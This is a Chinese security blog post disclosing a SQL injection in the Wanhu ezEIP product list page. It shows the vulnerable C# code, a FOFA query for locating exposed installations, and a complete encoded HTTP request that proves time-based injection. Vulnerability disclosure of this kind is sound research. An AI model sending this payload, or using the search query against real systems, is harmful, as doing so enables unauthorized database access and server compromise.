---
title: "万户ezEIP productlist.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/ezEIP-shop-productlist-svids-sqli.html
asset_dir: assets/万户ezeip-productlist.aspx-sql注入漏洞
---

# 万户ezEIP productlist.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/27 18:23
* 943浏览
* [0评论](#comment)
* 23分钟阅读

深入探索

Server

企业资源计划

服务器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万户ezEIP是一种[企业资源规划](#)软件，旨在帮助企业管理其各个方面的业务流程。它提供了一套集成的解决方案，涵盖了财务、供应链管理、销售和市场营销、人力资源等各个领域。万户ezEIP productlist.aspx 接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> `app="万户网络-ezEIP" || (body="ezEIP"||header="ezEIP")`

# 漏洞分析

```
//绑定已选中的搜选项
    private void BindChooseSearchValue()
    {
        string SearchValues = RequestUtil.Instance.GetString("svids").Replace("'", "");
        SearchValues = SearchValues.Trim(',');
        if (!string.IsNullOrEmpty(SearchValues))
        {
            StringBuilder searchHtml = new StringBuilder();
            SearchValues = Server.UrlDecode(SearchValues);
            string SQL = "SELECT S.SearchName,SV.SearchValueID,SV.SearchValueName FROM Whir_Shop_SearchValue SV LEFT JOIN Whir_Shop_Search S ON SV.SearchID=S.SearchID WHERE SV.SearchValueID IN (" + SearchValues + ")";
            List<ShopSearchValue> ssvlist = ShopSearchValueService.Instance.Query<ShopSearchValue>(SQL).ToList();
            foreach (ShopSearchValue ssv in ssvlist)
            {
                searchHtml.Append("<a  svid=\"" + ssv.SearchValueID + "\" style=\"cursor:pointer;\">" + ssv.SearchName + "：" + ssv.SearchValueName + "&nbsp;&nbsp;×</a>");
            }
            ltChooseSearchValue.Text = searchHtml.ToString();
        }
    }
```

深入探索

软件

ERP

计算机安全

svids 直接拼接进SQL语句执行，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /shop/productlist.aspx HTTP/1.1
Host: ezeip.mrxn.net
Content-Type: application/x-www-form-urlencoded

ob=price&price=asc&svids=1%29%3BDECLARE+%40%40test+VARCHAR%28100%29%3BSet+%40%40test%3DChar%28115%29%252bChar%28101%29%252bChar%28108%29%252bChar%28101%29%252bChar%2899%29%252bChar%28116%29%252bChar%2832%29%252bChar%2849%29%252bChar%2832%29%252bChar%28119%29%252bChar%28104%29%252bChar%28101%29%252bChar%28114%29%252bChar%28101%29%252bChar%2832%29%252bChar%2849%29%252bChar%2861%29%252bChar%2849%29%252bChar%2832%29%252bChar%2887%29%252bChar%2865%29%252bChar%2873%29%252bChar%2884%29%252bChar%2870%29%252bChar%2879%29%252bChar%2882%29%252bChar%2832%29%252bChar%2868%29%252bChar%2869%29%252bChar%2876%29%252bChar%2865%29%252bChar%2889%29%252bChar%2832%29%252bChar%2839%29%252bChar%2848%29%252bChar%2858%29%252bChar%2848%29%252bChar%2858%29%252bChar%2851%29%252bChar%2839%29%3BEXECUTE+%28%40%40test%29%3B--
```

成功延时 3 秒

代码安全审计

[![万户ezEIP productlist.aspx SQL注入漏洞](images/img-001-16f9730e5a5e.webp)](https://image.mrxn.net/40248af6ee8f46cbb21653e5f905f574.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万户ezEIP productlist.aspx SQL注入漏洞](https://mrxn.net/jswz/ezEIP-shop-productlist-svids-sqli.html)  
文章链接：<https://mrxn.net/jswz/ezEIP-shop-productlist-svids-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ezEIP-shop-productlist-svids-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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